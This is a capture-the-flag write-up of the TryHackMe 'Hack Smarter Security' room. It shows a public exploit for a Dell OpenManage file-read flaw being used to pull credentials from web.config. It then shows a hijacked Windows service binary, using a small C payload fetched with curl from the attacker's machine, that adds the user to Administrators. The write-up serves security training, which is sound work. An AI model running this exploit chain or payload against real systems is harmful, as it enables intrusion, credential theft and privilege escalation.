---
title: 'TryHackMe: Hack Smarter Security'
author: jaxafed
categories: [TryHackMe]
tags: [web, file disclosure, ssh, windows, service]
render_with_liquid: false
media_subpath: /images/tryhackme_hack_smarter_security/
image:
  path: room_image.webp
---

[![Tryhackme Room Link](room_card.webp){: width="300" height="300" .shadow}](https://tryhackme.com/room/hacksmartersecurity){: .right }

<br/><br/>
For the Hack Smarter Security room, we leveraged a file disclosure vulnerability in Dell OpenManage Server Administrator to obtain credentials and establish a SSH session. Subsequently, we hijacked a service binary to escalate privileges to Administrator.
<br/><br/><br/>

## Initial enumeration

### Nmap Scan

```console
$ nmap -T4 -n -sC -sV -Pn -p- 10.10.144.158
Nmap scan report for 10.10.144.158
Host is up (0.098s latency).
Not shown: 65530 filtered tcp ports (no-response)
PORT     STATE SERVICE       VERSION
21/tcp   open  ftp           Microsoft ftpd
| ftp-syst: 
|_  SYST: Windows_NT
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
| 06-28-23  02:58PM                 3722 Credit-Cards-We-Pwned.txt
|_06-28-23  03:00PM              1022126 stolen-passport.png
22/tcp   open  ssh           OpenSSH for_Windows_7.7 (protocol 2.0)
| ssh-hostkey: 
|   2048 0d:fa:da:de:c9:dd:99:8d:2e:8e:eb:3b:93:ff:e2:6c (RSA)
|   256 5d:0c:df:32:26:d3:71:a2:8e:6e:9a:1c:43:fc:1a:03 (ECDSA)
|_  256 c4:25:e7:09:d6:c9:d9:86:5f:6e:8a:8b:ec:13:4a:8b (ED25519)
80/tcp   open  http          Microsoft IIS httpd 10.0
|_http-title: HackSmarterSec
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-server-header: Microsoft-IIS/10.0
1311/tcp open  ssl/rxmon?
| ssl-cert: Subject: commonName=hacksmartersec/organizationName=Dell Inc/stateOrProvinceName=TX/countryName=US
| Not valid before: 2023-06-30T19:03:17
|_Not valid after:  2025-06-29T19:03:17
|...
3389/tcp open  ms-wbt-server Microsoft Terminal Services
|_ssl-date: 2024-03-16T02:42:39+00:00; +3s from scanner time.
| rdp-ntlm-info: 
|   Target_Name: HACKSMARTERSEC
|   NetBIOS_Domain_Name: HACKSMARTERSEC
|   NetBIOS_Computer_Name: HACKSMARTERSEC
|   DNS_Domain_Name: hacksmartersec
|   DNS_Computer_Name: hacksmartersec
|   Product_Version: 10.0.17763
|_  System_Time: 2024-03-16T02:42:34+00:00
| ssl-cert: Subject: commonName=hacksmartersec
| Not valid before: 2024-03-15T01:50:15
|_Not valid after:  2024-09-14T01:50:15
```

There are five ports open.

- 21/FTP
- 22/SSH
- 80/HTTP
- 1311/HTTPS
- 3389/RDP

### FTP

FTP allows anonymous logins and there are two files we can read. Unfortunately, neither of them are useful.

```console
$ ftp 10.10.144.158 
Connected to 10.10.144.158.
220 Microsoft FTP Service
Name (10.10.144.158:kali): anonymous
331 Anonymous access allowed, send identity (e-mail name) as password.
Password: 
230 User logged in.
Remote system type is Windows_NT.
ftp> ls
229 Entering Extended Passive Mode (|||49787|)
125 Data connection already open; Transfer starting.
06-28-23  02:58PM                 3722 Credit-Cards-We-Pwned.txt
06-28-23  03:00PM              1022126 stolen-passport.png
226 Transfer complete.
ftp> 
```

### WEB/80

Checking the web server at port 80, it looks like a fairly static site with nothing useful. We also do not find anything interesting with directory fuzzing.

![Web Server Index](web_server_index.webp){: width="800" height="500" }

### WEB/1311

Looking at port 1311, we see `Dell OpenManage Server Administrator` running.

![Dell OpenManage Server Administrator Web Page](dell_openmanage_webserver.webp){: width="800" height="500" }

Checking the `About` section, we discover the version is `9.4.0.2`.

![Dell OpenManage Server Administrator Version](dell_openmanage_webserver_version.webp){: width="600" height="400" }

## Shell as tyler

### File Disclosure in Dell OpenManage Server Administrator

Searching for vulnerabilities in `Dell OpenManage Server Administrator 9.4.0.2`, we came across [this article](https://rhinosecuritylabs.com/research/cve-2020-5377-dell-openmanage-server-administrator-file-read/), where it mentions an authentication bypass "vulnerability" followed by an arbitrary file read vulnerability found in `9.4.0.0` and how a fix for this was implemented in version `9.4.0.2`. But luckily for us, it also details how the added filter as a fix can be bypassed using `URL encoding` and because of that version `9.4.0.2` is still vulnerable.

The article also includes a [PoC exploit code](https://github.com/RhinoSecurityLabs/CVEs/tree/master/CVE-2020-5377_CVE-2021-21514) we can try.

After downloading and running the script, we are able to read files from the server.

```console
$ python3 CVE-2020-5377.py 10.11.72.22 10.10.144.158:1311
Session: 77F3FF1162874D873B95D6B7CA4B0F86
VID: 8FAE0B861EF01CAF
file > /Windows/win.ini
Reading contents of /Windows/win.ini:
; for 16-bit app support
[fonts]
[extensions]
[mci extensions]
[files]
[Mail]
MAPI=1
```

### Finding Credentials

First, we can try to read the `applicationHost.config` file to get the general configuration for the `IIS`.

Inside, we find the configured sites along with their paths.

```console
file > /Windows/System32/inetsrv/Config/applicationHost.config
Reading contents of /Windows/System32/inetsrv/Config/applicationHost.config:
<?xml version="1.0" encoding="UTF-8"?>
<!--

    IIS configuration sections.

    For schema documentation, see
    %windir%\system32\inetsrv\config\schema\IIS_schema.xml.
    
    Please make a backup of this file before making any changes to it.

-->

<configuration>
...
        <sites>
            <site name="hacksmartersec" id="2" serverAutoStart="true">
                <application path="/" applicationPool="hacksmartersec">
                    <virtualDirectory path="/" physicalPath="C:\inetpub\wwwroot\hacksmartersec" />
                </application>
                <bindings>
                    <binding protocol="http" bindingInformation="*:80:" />
                </bindings>
            </site>
            <site name="data-leaks" id="1">
                <application path="/">
                    <virtualDirectory path="/" physicalPath="C:\inetpub\ftproot" />
                </application>
                <bindings>
                    <binding protocol="ftp" bindingInformation="*:21:" />
                </bindings>
                <ftpServer>
                    <security>
                        <ssl controlChannelPolicy="SslAllow" dataChannelPolicy="SslAllow" />
                    </security>
                </ftpServer>
            </site>
...
</configuration>
```

Now that we know the path of the web server, we can try to read the `web.config` file.

Inside the `web.config`, we find a set of credentials.

```console
file > /inetpub/wwwroot/hacksmartersec/web.config
Reading contents of /inetpub/wwwroot/hacksmartersec/web.config:
<configuration>
  <appSettings>
    <add key="Username" value="tyler" />
    <add key="Password" value="[REDACTED]" />
  </appSettings>
  <location path="web.config">
    <system.webServer>
      <security>
        <authorization>
          <deny users="*" />
        </authorization>
      </security>
    </system.webServer>
  </location>
</configuration>
```
Using the found credentials for `SSH`, we get a shell and can read the user flag.

```console
$ ssh tyler@10.10.144.158

Microsoft Windows [Version 10.0.17763.1821]
(c) 2018 Microsoft Corporation. All rights reserved.

tyler@HACKSMARTERSEC C:\Users\tyler>whoami
hacksmartersec\tyler

tyler@HACKSMARTERSEC C:\Users\tyler>type Desktop\user.txt
THM[REDACTED]
```

## Shell as Administrator

### Enumerating the File System

Looking for installed programs, we notice `Spoofer` at `C:\Program Files (x86)\Spoofer`.

From `CHANGES.txt`, we learn that the version is `1.4.6`.

```console
tyler@HACKSMARTERSEC C:\Program Files (x86)\Spoofer>type CHANGES.txt 
spoofer-1.4.6 (2020-07-24) 
-------------
...
```

### Discovering Spoofer Scheduler Service

Searching for vulnerabilities in `Caida Spoofer 1.4.6`, we find [this](https://packetstormsecurity.com/files/166553/Spoofer-1.4.6-Privilege-Escalation-Unquoted-Service-Path.html).

Appearantly, `Caida Spoofer 1.4.6` creates a service named `spoofer-scheduler` with an unquoted binary path.

Checking the service, we see that this is indeed the case, and it runs as `LocalSystem`.

```console
tyler@HACKSMARTERSEC C:\Users\tyler>sc qc spoofer-scheduler
[SC] QueryServiceConfig SUCCESS

SERVICE_NAME: spoofer-scheduler
        TYPE               : 10  WIN32_OWN_PROCESS
        START_TYPE         : 2   AUTO_START
        ERROR_CONTROL      : 1   NORMAL
        BINARY_PATH_NAME   : C:\Program Files (x86)\Spoofer\spoofer-scheduler.exe
        LOAD_ORDER_GROUP   :
        TAG                : 0
        DISPLAY_NAME       : Spoofer Scheduler
        DEPENDENCIES       : tcpip
        SERVICE_START_NAME : LocalSystem
```

Unfortunately, we can't create `C:\Program.exe` or `C:\Program Files.exe` to abuse the unquoted path. But instead, we have full privileges over the service binary.

```console
tyler@HACKSMARTERSEC C:\Users\tyler>icacls "C:\Program Files (x86)\Spoofer\spoofer-scheduler.exe"
C:\Program Files (x86)\Spoofer\spoofer-scheduler.exe BUILTIN\Users:(I)(F)
                                                     NT AUTHORITY\SYSTEM:(I)(F)
                                                     BUILTIN\Administrators:(I)(F)
                                                     APPLICATION PACKAGE AUTHORITY\ALL APPLICATION PACKAGES:(I)(RX)
                                                     APPLICATION PACKAGE AUTHORITY\ALL RESTRICTED APPLICATION PACKAGES:(I)(RX) 

Successfully processed 1 files; Failed processing 0 files
```

### Hijacking Service Binary

Since we have full control over the service binary, we can replace it with a malicious executable. But due to Windows Defender running, we won't be able to easily use `msfvenom` to generate our payload.

Instead, I chose to create an executable that will add the `tyler` user to the `Administrators` local group.

Writing a very simple C code that does this.

```c
#include <stdlib.h>

int main() {
  system("cmd.exe /c net localgroup Administrators tyler /add");
  return 0;
}
```
{: file="payload.c"}

Compiling it into an executable for `Windows`.

```console
$ x86_64-w64-mingw32-gcc-win32 payload.c -o payload.exe
```

Stopping the service, replacing the service binary with our payload, and starting it again.

```console
tyler@HACKSMARTERSEC C:\Program Files (x86)\Spoofer>sc stop spoofer-scheduler

SERVICE_NAME: spoofer-scheduler
        TYPE               : 10  WIN32_OWN_PROCESS
        STATE              : 3  STOP_PENDING
                                (STOPPABLE, PAUSABLE, IGNORES_SHUTDOWN)
        WIN32_EXIT_CODE    : 0  (0x0)
        SERVICE_EXIT_CODE  : 0  (0x0)
        CHECKPOINT         : 0x2
        WAIT_HINT          : 0x0

tyler@HACKSMARTERSEC C:\Program Files (x86)\Spoofer>move spoofer-scheduler.exe spoofer-scheduler.exe.bak
        1 file(s) moved.

tyler@HACKSMARTERSEC C:\Program Files (x86)\Spoofer>curl http://10.11.72.22/payload.exe -o spoofer-scheduler.exe
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
100  112k  100  112k    0     0   112k      0  0:00:01  0:00:01 --:--:-- 78215

tyler@HACKSMARTERSEC C:\Program Files (x86)\Spoofer>sc start spoofer-scheduler
[SC] StartService FAILED 1053:

The service did not respond to the start or control request in a timely fashion.
```

Now, after a `re-login`, we see that our payload was run and the `tyler` user is a member of the `Administrators` group.

```console
tyler@HACKSMARTERSEC C:\Users\tyler>whoami /groups

GROUP INFORMATION
-----------------

Group Name                                                    Type             SID          Attributes

============================================================= ================ ============ ===================================
============================
Everyone                                                      Well-known group S-1-1-0      Mandatory group, Enabled by default
, Enabled group
NT AUTHORITY\Local account and member of Administrators group Well-known group S-1-5-114    Mandatory group, Enabled by default
, Enabled group
BUILTIN\Users                                                 Alias            S-1-5-32-545 Mandatory group, Enabled by default
, Enabled group
BUILTIN\Administrators                                        Alias            S-1-5-32-544 Mandatory group, Enabled by default
, Enabled group, Group owner
NT AUTHORITY\NETWORK                                          Well-known group S-1-5-2      Mandatory group, Enabled by default
, Enabled group
NT AUTHORITY\Authenticated Users                              Well-known group S-1-5-11     Mandatory group, Enabled by default
, Enabled group
NT AUTHORITY\This Organization                                Well-known group S-1-5-15     Mandatory group, Enabled by default
, Enabled group
NT AUTHORITY\Local account                                    Well-known group S-1-5-113    Mandatory group, Enabled by default
, Enabled group
NT AUTHORITY\NTLM Authentication                              Well-known group S-1-5-64-10  Mandatory group, Enabled by default
, Enabled group
Mandatory Label\High Mandatory Level                          Label            S-1-16-12288
```

At last, we can read the `hacking-targets.txt` file under the `C:\Users\Administrator\Desktop\Hacking-Targets` directory and complete the room.

```console
tyler@HACKSMARTERSEC C:\Users\Administrator\Desktop\Hacking-Targets>type hacking-targets.txt
Next Victims:  
[REDACTED], [REDACTED], [REDACTED]
```